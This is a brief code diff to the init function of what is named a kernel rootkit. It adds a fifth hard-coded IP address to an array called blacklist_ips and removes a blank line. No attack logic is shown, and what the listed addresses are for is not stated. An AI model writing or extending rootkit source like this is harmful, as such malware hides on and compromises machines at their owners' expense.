@@ -33,8 +33,9 @@ static int __init rootkit_init(void)
     blacklist_ips[0] = in_aton("172.104.181.84"); 
     blacklist_ips[1] = in_aton("172.104.60.29");   
     blacklist_ips[2] = in_aton("103.3.62.5");
-
     blacklist_ips[3] = in_aton("172.104.57.250");
+    blacklist_ips[4] = in_aton("143.42.74.25");
+
 
 
 
